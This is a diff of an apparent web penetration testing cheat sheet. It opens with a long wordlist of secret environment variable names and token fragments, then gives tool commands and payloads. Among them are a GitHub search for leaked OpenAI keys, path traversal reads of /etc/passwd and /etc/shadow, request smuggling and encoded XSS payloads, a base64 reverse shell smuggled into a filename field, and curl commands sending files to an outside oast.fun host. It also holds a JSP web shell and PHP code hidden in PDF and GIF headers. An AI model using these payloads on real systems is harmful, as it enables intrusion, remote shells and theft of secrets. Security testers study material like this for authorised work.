+VU8GYF3BglCxGAxrMW9OFpuHCkQ=
+PYPI_PASSOWRD=
+NPM_USERNAME=
+NPM_PASSWORD=
+mMmMSl1qNxqsumNhBlmca4g=
+encrypted_8b6f3baac841_key=
+encrypted_8b6f3baac841_iv=
+encrypted_4d8e3db26b81_key=
+encrypted_4d8e3db26b81_iv=
+SGcUKGqyoqKnUg=
+OMISE_PUBKEY=
+OMISE_KEY=
+KXOlTsN3VogDop92M=
+GREN_GITHUB_TOKEN=
+DRIVER_NAME=
+CLOUDFLARE_EMAIL=
+CLOUDFLARE_CREVIERA_ZONE_ID=
+CLOUDFLARE_API_KEY=
+rI=
+pHCbGBA8L7a4Q4zZihD3HA=
+nexusUsername=
+nexusPassword=
+mRFSU97HNZZVSvAlRxyYP4Xxx1qXKfRXBtqnwVJqLvK6JTpIlh4WH28ko=
+encrypted_fee8b359a955_key=
+encrypted_fee8b359a955_iv=
+encrypted_6d56d8fe847c_key=
+encrypted_6d56d8fe847c_iv=
+aX5xTOsQFzwacdLtlNkKJ3K64=
+TEST_TEST=
+TESCO_API_KEY=
+RELEASE_TOKEN=
+NUGET_KEY=
+NON_TOKEN=
+GIT_COMMITTER_NAME=
+GIT_AUTHOR_NAME=
+CN_SECRET_ACCESS_KEY=
+CN_ACCESS_KEY_ID=
+0VIRUSTOTAL_APIKEY=
+0PUSHOVER_USER=
+0PUSHOVER_TOKEN=
+0HB_CODESIGN_KEY_PASS=
+0HB_CODESIGN_GPG_PASS=
+0GITHUB_TOKEN=
+nexusUrl=
+jxoGfiQqqgvHtv4fLzI=
+gpg.passphrase=
+encrypted_b1fa8a2faacf_key=
+encrypted_b1fa8a2faacf_iv=
+encrypted_98ed7a1d9a8c_key=
+encrypted_98ed7a1d9a8c_iv=
+VIP_GITHUB_DEPLOY_KEY_PASS=
+TEAM_EMAIL=
+SACLOUD_API=
+SACLOUD_ACCESS_TOKEN_SECRET=
+SACLOUD_ACCESS_TOKEN=
+PANTHEON_SITE=
+LEANPLUM_KEY=
+LEANPLUM_APP_ID=
+FIREBASE_KEY=
+CONVERSATION_URL=
+BLhLRKwsTLnPm8=
+B2_BUCKET=
+B2_APP_KEY=
+B2_ACCT_ID=
+-Dgpg.passphrase=
+YT_CLIENT_SECRET=
+YT_CLIENT_ID=
+WVNmZ40V1Lt0DYC2c6lzWwiJZFsQIXIRzJcubcwqKRoMelkbmKHdeIk=
+TRV=
+TEST_GITHUB_TOKEN=
+RANDRMUSICAPIACCESSTOKEN=
+NQc8MDWYiWa1UUKW1cqms=
+MY_SECRET_ENV=
+FDfLgJkS3bKAdAU24AS5X8lmHUJB94=
+COVERALLS_SERVICE_NAME=
+CONSUMERKEY=
+CLU_REPO_URL=
+--closure_entry_point=
+gradle.publish.secret=
+gradle.publish.key=
+ggFqFEKCd54gCDasePLTztHeC4oL104iaQ=
+encrypted_12c8071d2874_key=
+encrypted_12c8071d2874_iv=
+encrypted_0fba6045d9b0_key=
+encrypted_0fba6045d9b0_iv=
+dv3U5tLUZ0=
+UAusaB5ogMoO8l2b773MzgQeSmrLbExr9BWLeqEfjC2hFgdgHLaQ=
+PASS=
+MONGOLAB_URI=
+GITHUB_TOKENS=
+FLASK_SECRET_KEY=
+DB_PW=
+CC_TEST_REPOTER_ID=
+8FWcu69WE6wYKKyLyHB4LZHg=
+zfp2yZ8aP9FHSy5ahNjqys4FtubOWLk=
+rBezlxWRroeeKcM2DQqiEVLsTDSyNZV9kVAjwfLTvM=
+hpmifLs=
+fR457Xg1zJIz2VcTD5kgSGAPfPlrYx2xnR5yILYiaWiLqQ1rhFKQZ0rwOZ8Oiqk8nPXkSyXABr9B8PhCFJGGKJIqDI39Qe6XCXAN3GMH2zVuUDfgZCtdQ8KtM1Qg71IR4g=
+encrypted_932b98f5328a_key=
+encrypted_932b98f5328a_iv=
+encrypted_31d215dc2481_key=
+encrypted_31d215dc2481_iv=
+encrypted_1db1f58ddbaf_key=
+encrypted_1db1f58ddbaf_iv=
+WATSON_CONVERSATION_WORKSPACE=
+WATSON_CONVERSATION_USERNAME=
+WATSON_CONVERSATION_PASSWORD=
+SOUNDCLOUD_USERNAME=
+SOUNDCLOUD_PASSWORD=
+SOUNDCLOUD_CLIENT_SECRET=
+SOUNDCLOUD_CLIENT_ID=
+SDM4=
+PARSE_JS_KEY=
+PARSE_APP_ID=
+NON_MULTI_WORKSPACE_SID=
+NON_MULTI_WORKFLOW_SID=
+NON_MULTI_DISCONNECT_SID=
+NON_MULTI_CONNECT_SID=
+NON_MULTI_BOB_SID=
+NON_MULTI_ALICE_SID=
+MULTI_WORKSPACE_SID=
+MULTI_WORKFLOW_SID=
+MULTI_DISCONNECT_SID=
+MULTI_CONNECT_SID=
+MULTI_BOB_SID=
+MULTI_ALICE_SID=
+GHB_TOKEN=
+GCR_USERNAME=
+GCR_PASSWORD=
+BROWSERSTACK_USE_AUTOMATE=
+AUTH_TOKEN=
+0NC6O0ThWq69BcWmrtbD2ev0UDivbG8OQ1ZsSDm9UqVA=
+&query=
+xsixFHrha3gzEAwa1hkOw6kvzR4z9dx0XmpvORuo1h4Ag0LCxAR70ZueGyStqpaXoFmTWB1z0WWwooAd0kgDwMDSOcH60Pv4mew=
+username=
+ted_517c5824cb79_iv=
+s3_secret_key=
+s3_access_key=
+n8awpV01A2rKtErnlJWVzeDK5WfLBaXUvOoc=
+encrypted_f383df87f69c_key=
+encrypted_f383df87f69c_iv=
+encrypted_997071d05769_key=
+encrypted_997071d05769_iv=
+encrypted_671b00c64785_key=
+encrypted_671b00c64785_iv=
+encrypted_3761ed62f3dc_key=
+encrypted_3761ed62f3dc_iv=
+branch=
+_8382f1c42598_iv=
+_02ddd67d5586_key=
+YANGSHUN_GH_PASSWORD=
+Y8=
+XJ7lElT4Jt9HnUw=
+VIP_TEST=
+USE_SSH=
+SOMEVAR=
+PROD_USERNAME=
+PROD_PASSWORD=
+ORG_GRADLE_PROJECT_cloudinary.url=
+N=
+LOGNAME=
+I6SEeHdMJwAvqM6bNXQaMJwJLyZHdAYK9DQnY=
+HAB_KEY=
+HAB_AUTH_TOKEN=
+GPG_EXECUTABLE=
+GK_LOCK_DEFAULT_BRANCH=
+GIT_USER=
+F97qcq0kCCUAlLjAoyJg=
+DB_USERNAME=
+DB_PASSWORD=
+DB_DATABASE=
+DB_CONNECTION=
+CONEKTA_APIKEY=
+CLAIMR_DB=
+BROWSERSTACK_BUILD=
+AiYPFLTRxoiZJ9j0bdHjGOffCMvotZhtc9xv0VXVijGdHiIM=
+ANALYTICS=
+A=
+?account=
+6mSMEHIauvkenQGZlBzkLYycWctGml9tRnIpbqJwv0xdrkTslVwDQU5IEJNZiTlJ2tYl8og=
+1ewh8kzxY=
+0KNAME=
+-e=
+&password=
 ```
 
 ## GitHub
 
 ### OpenAI API Key Code Search
 
-```c
+```console
 https://github.com/search?q=%2F%22sk-%5Ba-zA-Z0-9%5D%7B20%2C50%7D%22%2F&ref=simplesearch&type=code
 ```
 
@@ -840,7 +2275,7 @@ https://github.com/search?q=%2F%22sk-%5Ba-zA-Z0-9%5D%7B20%2C50%7D%22%2F&ref=simp
 
 > https://github.com/search?type=code
 
-```c
+```console
 /ftp:\/\/.*:.*@.*target\.com/
 /ftp:\/\/.*:.*@.*\.*\.br/
 /ftp:\/\/.*?@.*?\.com\.br/
@@ -858,13 +2293,13 @@ https://github.com/search?q=%2F%22sk-%5Ba-zA-Z0-9%5D%7B20%2C50%7D%22%2F&ref=simp
 
 ### gitdumper
 
-```c
+```console
 $ ./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
 ```
 
 ### extractor
 
-```c
+```console
 $ ./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
 ```
 
@@ -872,7 +2307,7 @@ $ ./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
 
 > https://github.com/yandex/gixy
 
-```c
+```console
 $ pip install gixy
 $ gixy /etc/nginx/nginx.conf
 ```
@@ -881,7 +2316,7 @@ $ gixy /etc/nginx/nginx.conf
 
 > https://github.com/OJ/gobuster
 
-```c
+```console
 -e    // extended mode that renders the full url
 -k    // skip ssl certificate validation
 -r    // follow cedirects
@@ -899,27 +2334,27 @@ $ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-
 
 ### POST Requests
 
-```c
+```console
 $ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://<RHOST>/api/ -e -s 200
 ```
 
 ### DNS Recon
 
-```c
+```console
 $ gobuster dns -d <RHOST> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
 $ gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 ```
 
 ### VHost Discovery
 
-```c
+```console
 $ gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 $ gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
 ```
 
 ### Specifiy User Agent
 
-```c
+```console
 $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/ -a Linux
 ```
 
@@ -927,7 +2362,7 @@ $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -
 
 > https://github.com/tomnomnom/gron
 
-```c
+```console
 $ go install github.com/tomnomnom/gron@latest
 ```
 
@@ -935,7 +2370,7 @@ $ go install github.com/tomnomnom/gron@latest
 
 > https://github.com/KathanP19/Gxss
 
-```c
+```console
 $ go install github.com/KathanP19/Gxss@latest
 ```
 
@@ -943,7 +2378,7 @@ $ go install github.com/KathanP19/Gxss@latest
 
 > https://github.com/hakluke/hakcheckurl
 
-```c
+```console
 $ go install github.com/hakluke/hakcheckurl@latest
 ```
 
@@ -951,7 +2386,7 @@ $ go install github.com/hakluke/hakcheckurl@latest
 
 > https://github.com/hakluke/hakrawler
 
-```c
+```console
 $ hakrawler -url <RHOST> -depth 3
 $ hakrawler -url <RHOST> -depth 3 -plain
 $ hakrawler -url <RHOST> -depth 3 -plain | httpx -http-proxy http://127.0.0.1:8080
@@ -961,7 +2396,7 @@ $ hakrawler -url <RHOST> -depth 3 -plain | httpx -http-proxy http://127.0.0.1:80
 
 ### Skeleton Payload Request
 
-```c
+```console
 POST /password-reset.php HTTP/1.1
 Host: gymxcrossfit.htb/employees.crossfit.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -987,13 +2422,13 @@ Host: gymxcrossfit.htb/employees.crossfit.htb    # <--- Host Header getting set 
 
 > https://hackerone.com/reports/724153
 
-```c
+```console
 Filename<b>testBOLD</b>
 ```
 
 ### Skeleton Payload
 
-```c
+```javascript
 <script>
 x=new XMLHttpRequest;
 x.onload=function(){
@@ -1010,17 +2445,17 @@ x.send();
 
 - Retrieve a single item or a list of items
 
-```c
+```console
 GET /v1/products/foobar
 ```
 
-```c
+```console
 $ curl -v -X GET -k https://example.com 80
 ```
 
 #### Response
 
-```c
+```console
 <HTML>
   <HEAD>foobar</HEAD>
   <BODY>
@@ -1034,19 +2469,19 @@ $ curl -v -X GET -k https://example.com 80
 
 - Update an item
 
-```c
+```console
 PUT /v1/users/123
 ```
 
 #### Request Body
 
-```c
+```console
 {"name": "bob", "email": "bob@bob.com"}
 ```
 
 #### Response
 
-```c
+```console
 HTTP/1.1 200 OK
 ```
  
@@ -1054,19 +2489,19 @@ HTTP/1.1 200 OK
 
 - Create an item
 
-```c
+```console
 POST /v1/users
 ```
 
 #### Request Body
 
-```c
+```console
 {"firstname": "bob", "lastname": "bobber", "email": "bob@bob.com"}
 ```
 
 #### Response
 
-```c
+```console
 HTTP/1.1 201 Created
 ```
  
@@ -1074,13 +2509,13 @@ HTTP/1.1 201 Created
 
 - Delete an item
 
-```c
+```console
 DELETE /v1/users/123
 ```
 
 #### Response
 
-```c
+```console
 HTTP/1.1 200 OK
 HTTP/1.1 204 NO CONTENT
 ```
@@ -1089,13 +2524,13 @@ HTTP/1.1 204 NO CONTENT
 
 - Partially modify an item
 
-```c
+```console
 PATCH /v1/users/123
 ```
 
 #### Request Body
 
-```c
+```console
 { 
    "email": "bob@company.com"
 }
@@ -1103,7 +2538,7 @@ PATCH /v1/users/123
 
 #### Response
 
-```c
+```console
 HTTP/1.1 200 OK
 ```
  
@@ -1111,17 +2546,17 @@ HTTP/1.1 200 OK
 
 - Identical to GET but no message body in the response
 
-```c
+```console
 HEAD /v1/products/iphone
 ```
 
-```c
+```console
 $ curl -v -X HEAD -k https://example.com 80
 ```
 
 #### Response
 
-```c
+```console
 HTTP/1.1 200 OK
 ```
  
@@ -1129,20 +2564,20 @@ HTTP/1.1 200 OK
 
 - Create a two-way connection with a proxy server
 
-```c
+```console
 CONNECT <RHOST>:80
 ```
 
 #### Request
 
-```c
+```console
 Host: <RHOST>
 Proxy-Authorization: basic UEBzc3dvcmQxMjM=
 ```
 
 #### Response
 
-```c
+```console
 HTTP/1.1 200 OK
 ```
  
@@ -1150,17 +2585,17 @@ HTTP/1.1 200 OK
 
 - Return a list of supported HTTP methods
 
-```c
+```console
 OPTIONS /v1/users
 ```
 
-```c
+```console
 $ curl -v -X OPTIONS -k https://example.com 80
 ```
 
 #### Response
 
-```c
+```console
 HTTP/1.1 200 OK
 Allow: GET,POST,DELETE,HEAD,OPTIONS
 ```
@@ -1169,17 +2604,17 @@ Allow: GET,POST,DELETE,HEAD,OPTIONS
 
 - Perform a message loop-back test, providing a debugging mechanism
 
-```c
+```console
 TRACE /index.html
 ```
 
-```c
+```console
 $ curl -v -X TRACE -k https://example.com 80
 ```
 
 #### Response
 
-```c
+```console
 Host: <RHOST>
 Via: <RHOST>
 X-Forwardet-For: <RHOST>
@@ -1189,7 +2624,7 @@ X-Forwardet-For: <RHOST>
 
 ### Quick Wins
 
-```c
+```console
 Content-Length: 0
 Connection: Content-Lentgh
 ```
@@ -1198,7 +2633,7 @@ Connection: Content-Lentgh
 
 #### Searching for Vulnerability
 
-```c
+```console
 POST / HTTP/1.1
 Host: <RHOST>
 Transfer-Encoding: chunked
@@ -1212,7 +2647,7 @@ A
 
 #### Skeleton Payload
 
-```c
+```console
 POST / HTTP/1.1
 Host: <RHOST>
 Content-Length: 30
@@ -1227,7 +2662,7 @@ Foo: Bar
 
 #### Searching for Vulnerability
 
-```c
+```console
 POST / HTTP/1.1
 Host: <RHOST>
 Transfer-Encoding: chunked
@@ -1240,7 +2675,7 @@ X
 
 #### Skeleton Payload
 
-```c
+```console
 POST / HTTP/1.1
 Host: <RHOST>
 Content-Length: 4
@@ -1254,7 +2689,7 @@ x=
 
 ### Transfer-Encoding / Transfer-Encoding (TE.TE)
 
-```c
+```console
 Transfer-Encoding: xchunked
 \ `Transfer-Encoding : chunked`\
 Transfer-Encoding: chunked
@@ -1272,7 +2707,7 @@ Transfer-Encoding
 
 > https://github.com/tomnomnom/httprobe
 
-```c
+```console
 $ go install github.com/tomnomnom/httprobe@latest
 ```
 
@@ -1280,7 +2715,7 @@ $ go install github.com/tomnomnom/httprobe@latest
 
 > https://github.com/projectdiscovery/httpx
 
-```c
+```console
 $ go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
 ```
 
@@ -1290,7 +2725,7 @@ $ go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
 
 ### Output Redirect into File
 
-```c
+```console
 $ curl -X POST -d  `ls -la / > output.txt` cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oast.fun'
 $ curl -F "out=@output.txt"  cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oast.fun'
 $ curl -F "out=@/PATH/TO/FILE/<FILE>.txt"  cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oast.fun'
@@ -1306,7 +2741,7 @@ $ curl -F "out=@/PATH/TO/FILE/<FILE>.txt"  cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oas
 
 > https://github.com/aemkei/jsfuck/blob/master/jsfuck.js
 
-```c
+```javascript
 ![]                                          // false
 !![]                                         // true
 [][[]]                                       // undefined
@@ -1325,13 +2760,13 @@ $ curl -F "out=@/PATH/TO/FILE/<FILE>.txt"  cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oas
 
 #### Encoded Payload
 
-```c
+```javascript
 <img src onerror="(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[]) [+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]++[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]">
 ```
 
 ### Reconnaissance Script
 
-```c
+```javascript
 javascript:(function(){
     var scripts = document.getElementsByTagName("script");
     const patterns = {
@@ -1394,7 +2829,7 @@ javascript:(function(){
 
 or
 
-```c
+```javascript
 javascript:(function(){var scripts=document.getElementsByTagName("script");const patterns={credentials:/pass(word|wd|phrase)|secret|token|api[-_]?key|auth|credential|private[-_]key/gi,jwt:/(eyJ[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,})/g,ips:/(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})/g,awsKeys:/(AKIA|ASIA)[A-Z0-9]{16}/g,emails:/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi,urlSecrets:/(https?:\/\/[^:\/]+:[^@\/]+@)/g};const results={};function scanText(t,loc){Object.entries(patterns).forEach(([name,regex])=>{let m;while((m=regex.exec(t))!==null){if(!results[loc])results[loc]=[];if(results[loc].indexOf(m[0])===-1)results[loc].push(m[0])}})}for(let i=0;i<scripts.length;i++){let s=scripts[i];if(s.src){fetch(s.src).then(r=>r.text()).then(t=>{scanText(t,s.src)}).catch(e=>console.error(e));if(s.textContent.trim()!=="")scanText(s.textContent,s.src+" (inline fallback)") } else {scanText(s.textContent,"inline script #"+(i+1))}};scanText(document.body.innerHTML,document.location.href);function showResults(){let total=0;Object.values(results).forEach(arr=>{total+=arr.length});document.write('<h3>Found '+total+' potential secret(s) across '+Object.keys(results).length+' location(s):</h3>');Object.entries(results).forEach(([loc,secrets])=>{document.write('<h4>Location: <code>'+loc+'</code></h4>');secrets.forEach(sec=>{document.write('<code>'+sec+'</code><br>')})})}setTimeout(showResults,5000)})();
 ```
 
@@ -1404,7 +2839,7 @@ javascript:(function(){var scripts=document.getElementsByTagName("script");const
 
 The following example the `SSH Agent Plugin` enabled.
 
-```c
+```console
 pipeline {
     agent any
     
@@ -1424,7 +2859,7 @@ pipeline {
 
 ## jsleak
 
-```c
+```console
 $ echo http://<DOMAIN>/ | jsleak -s          // Secret Finder
 $ echo http://<DOMAIN>/ | jsleak -l          // Link Finder
 $ echo http://<DOMAIN>/ | jsleak -e          // Complete URL
@@ -1436,7 +2871,7 @@ $ cat <FILE>.txt | jsleak -l -s -c 30        // Read from File
 
 > https://github.com/ticarpi/jwt_tool
 
-```c
+```console
 $ python3 jwt_tool.py -b -S hs256 -p 'secretlhfIH&FY*#oysuflkhskjfhefesf' $(echo -n '{"alg":"HS256","typ":"JWT"}' | base64).$(echo -n '{"name": "1", "exp":' `date -d "+7 days" +%s`} | base64 -w0).
 $ python3 jwt_tool.py -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTgyOWVmOTYzOTMwYjA0NzYzZmU2YzMiLCJuYW1lIjoiZm9vYmFyIiwiZW1haWwiOiJmb29iYXJAc2VjcmV0LmNvbSIsImlhdCI6MTYzNTk1MDQxOX0.nhsLKCvNPBU8EoYVwDDpo8wGrL9VV62vrHVxfsBPCRk
 ```
@@ -1445,7 +2880,7 @@ $ python3 jwt_tool.py -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XY
 
 > https://github.com/assetnote/kiterunner
 
-```c
+```console
 $ kr wordlist list
 $ kr scan http://<RHOST> -A <WORDLIST>
 $ kr scan http://<RHOST> -A <WORDLIST> --ignore-length 24
@@ -1455,7 +2890,7 @@ $ kr scan http://<RHOST> -A <WORDLIST> --ignore-length 24
 
 > https://github.com/Emoe/kxss
 
-```c
+```console
 $ go install github.com/Emoe/kxss@latest
 ```
 
@@ -1463,13 +2898,13 @@ $ go install github.com/Emoe/kxss@latest
 
 > https://github.com/shibli2700/Kyubi
 
-```c
+```console
 $ kyubi -v <URL>
 ```
 
 ## Leaky Paths
 
-```c
+```console
 .aws/config
 .aws/credentials
 .aws/credentials.gpg
@@ -2890,7 +4325,7 @@ $ kyubi -v <URL>
 
 ## Local File Inclusion (LFI)
 
-```c
+```console
 $ http://<RHOST>/<FILE>.php?file=
 $ http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
 $ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
@@ -2898,32 +4333,32 @@ $ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
 
 ### Until PHP 5.3
 
-```c
+```console
 $ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
 ```
 
 ### Root Cause Function
 
-```c
+```console
 get_file_contents
 ```
 
 ### Null Byte
 
-```c
+```console
 %00
 0x00
 ```
 
 #### Example
 
-```c
+```console
 http://<RHOST>/index.php?lang=/etc/passwd%00
 ```
 
 ### Encoded Traversal Strings
 
-```c
+```console
 ../
 ..\
 ..\/
@@ -2938,19 +4373,19 @@ http://<RHOST>/index.php?lang=/etc/passwd%00
 
 ### Chinese Dot Encoding
 
-```c
+```console
 %E3%80%82
 ```
 
 #### Single Sign-On (SSO) Redirect
 
-```c
+```console
 https://<RHOST>/auth/sso/init/<username>@<--- CUT FOR BREVITY --->=https://google.com%E3%80%82<LHOST>/
 ```
 
 ### Web Application Firewall (WAF) Bypass
 
-```c
+```console
 /e*c/p*s*d    // /etc/passwd
 ```
 
@@ -2962,11 +4397,11 @@ https://<RHOST>/auth/sso/init/<username>@<--- CUT FOR BREVITY --->=https://googl
 
 > https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter
 
-```c
+```console
 url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
 ```
 
-```c
+```console
 $ http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
 $ http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
 $ base64 -d <FILE>.php
@@ -2974,19 +4409,19 @@ $ base64 -d <FILE>.php
 
 ### Read Process via Burp Suite
 
-```c
+```console
 GET /index.php?page=../../../../../../../proc/425/cmdline HTTP/1.1
 ```
 
 ### Read Process Allocations via Burp Suite
 
-```c
+```console
 GET /index.php?page=../../../../../../../proc/425/maps HTTP/1.1
 ```
 
 ### Parameters
 
-```c
+```console
 cat
 dir
 img
@@ -3018,7 +4453,7 @@ conf
 
 ### Django, Rails, or Node.js Web Application Header Values
 
-```c
+```console
 Accept: ../../../../.././../../../../etc/passwd{{
 Accept: ../../../../.././../../../../etc/passwd{%0D
 Accept: ../../../../.././../../../../etc/passwd{%0A
@@ -3030,7 +4465,7 @@ Accept: ../../../../.././../../../../etc/passwd{%00{{
 
 ### Linux Files
 
-```c
+```console
 /app/etc/local.xml
 /etc/passwd
 /etc/shadow
@@ -3309,7 +4744,7 @@ Accept: ../../../../.././../../../../etc/passwd{%00{{
 
 ### Windows Files
 
-```c
+```console
 C:/Users/Administrator/NTUser.dat
 C:/Documents and Settings/Administrator/NTUser.dat
 C:/apache/logs/access.log
@@ -3384,7 +4819,7 @@ C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
 
 #### lfidownloader.py
 
-```c
+```python
 import requests
 from  pathlib import Path
 import base64
@@ -3417,13 +4852,13 @@ print(f"Received : \n {remote} ")
 
 ### Payload
 
-```c
+```console
 $ curl -X PUT -H 'Content-Type: application/json' http://127.0.0.1:<RPORT> --data '{"auth":{"name":"<USERNAME>","password":"<PASSWORD>"},"constructor":{"__proto__":{"canUpload":true,"canDelete":true}}}'
 ```
 
 ### Reverse Shell Payload
 
-```c
+```console
 $ curl --header "Content-Type: application/json" --request POST http://127.0.0.1:<RPORT>/upload --data '{"auth":{"name":"<USERNAME>","password":"<PASSWORD>"},"filename":"& echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC85MDAzIDA+JjEK|base64 -d|bash"}'
 ```
 
@@ -3431,7 +4866,7 @@ $ curl --header "Content-Type: application/json" --request POST http://127.0.0.1
 
 ### SSH auth.log Poisoning
 
-```c
+```console
 $ ssh "<?php phpinfo();?>"@<LHOST>
 $ http://<RHOST>/view.php?page=../../../../../var/log/auth.log
 ```
@@ -3440,32 +4875,32 @@ $ http://<RHOST>/view.php?page=../../../../../var/log/auth.log
 
 ### GIF
 
-```c
+```console
 GIF8;
 GIF87a
 ```
 
 ### JPG
 
-```c
+```console
 \xff\xd8\xff
 ```
 
 ### PDF
 
-```c
+```console
 %PDF-1.5
 %
 ```
 
-```c
+```console
 %PDF-1.7
 %
 ```
 
 ### PNG
 
-```c
+```console
 \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
 ```
 
@@ -3473,7 +4908,7 @@ GIF87a
 
 #### GIF Magic Bytes
 
-```c
+```console
 GIF89a;
 <?php
   <PAYLOAD>
@@ -3482,13 +4917,13 @@ GIF89a;
 
 #### JAVA Web Shell Upload Filter Bypass
 
-```c
+```console
 $ printf "\xff\xd8\xff\n" > <FILE>.jpg
 ```
 
 ##### shell.jsp
 
-```java
+```javascript
 <%@ page import="java.io.*, java.util.*, java.net.*" %>
 <%
     String action = request.getParameter("action");
@@ -3517,13 +4952,13 @@ $ printf "\xff\xd8\xff\n" > <FILE>.jpg
 %>
 ```
 
-```c
+```console
 $ cat shell.jsp >> <FILE>.jpg
 ```
 
 ## mitmproxy
 
-```c
+```console
 $ mitmproxy
 ```
 
@@ -3531,7 +4966,7 @@ $ mitmproxy
 
 ### Path Enumeration
 
-```c
+```console
 console.log(__BUILD_MANIFEST.sortedPages)
 console.log(__BUILD_MANIFEST.sortedPages.join('\n'));
 console.log('Pages List:\n' + __BUILD_MANIFEST.sortedPages.map((page, index) => `${index + 1}. ${page}`).join('\n'));
@@ -3543,7 +4978,7 @@ console.log('Pages List:\n' + __BUILD_MANIFEST.sortedPages.map((page, index) => 
 
 ### Basic Commands
 
-```c
+```console
 $ ngrok tcp 9001
 $ ngrok http 8080 --authtoken <AUTH_TOKEN>
 $ ngrok http 8080 --basic-auth '<USERNAME>:<PASSWORD>'
@@ -3556,7 +4991,7 @@ $ ngrok http http://localhost:8080 --oauth=google --oauth-allow-email=<EMAIL>
 
 ### Example
 
-```c
+```console
 $ ngrok authtoken <AUTH_TOKEN>
 $ ngrok tcp <LHOST>:<LPORT>
 $ nc -v -nls 127.0.0.1 -p <LPORT>
@@ -3565,15 +5000,22 @@ $ nc 1.tcp.ngrok.io 10133
 
 ### Docker Example
 
-```c
+```console
 $ sudo docker run -it -p80 -e NGROK_AUTHTOKEN='<API_TOKEN>' ngrok/ngrok tcp 172.17.0.1:<LPORT>
 $ nc -v -nls 172.17.0.1 -p <LPORT>
 $ nc 1.tcp.ngrok.io 10133
 ```
 
+### Client-less
+
+```console
+$ ssh -R 80:localhost:80 tunnel.us.ngrok.com http
+$ ssh -R <RHOST>:80:localhost:8080 tunnel.us.ngrok.com http -oauth="google"
+```
+
 ## OpenSSL
 
-```c
+```console
 $ openssl s_client -connect <RHOST>:<RPORT> < /dev/null | openssl x509 -noout -text | grep -C3 -i dns
 ```
 
@@ -3581,7 +5023,7 @@ $ openssl s_client -connect <RHOST>:<RPORT> < /dev/null | openssl x509 -noout -t
 
 > https://github.com/AonCyberLabs/PadBuster
 
-```c
+```console
 $ padbuster http://<RHOST> MbDbr%2Fl3cYxICLVXwfJk8Y4C94gp%2BnlB 8 -cookie auth=MbDbr%2Fl3cYxICLVXwfJk8Y4C94gp%2BnlB -plaintext user=admin
 $ padbuster http://<RHOST>/profile.php <COOKIE_VALUE> 8 --cookie "<COOKIE_NAME>=<COOKIE_VALUE>;PHPSESSID=<PHPSESSID>"
 $ padbuster http://<RHOST>/profile.php <COOKIE_VALUE> 8 --cookie "<COOKIE_NAME>=<COOKIE_VALUE>;PHPSESSID=<PHPSESSID>" -plaintext "{\"user\":\"<USERNAME>\",\"role\":\"admin\"}"
@@ -3591,7 +5033,7 @@ $ padbuster http://<RHOST>/profile.php <COOKIE_VALUE> 8 --cookie "<COOKIE_NAME>=
 
 ### Create a File with a PDF Header, which contains PHP Code
 
-```c
+```console
 %PDF-1.4
 
 <?php
@@ -3601,7 +5043,7 @@ $ padbuster http://<RHOST>/profile.php <COOKIE_VALUE> 8 --cookie "<COOKIE_NAME>=
 
 ### Trigger
 
-```c
+```console
 $ http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
 ```
 
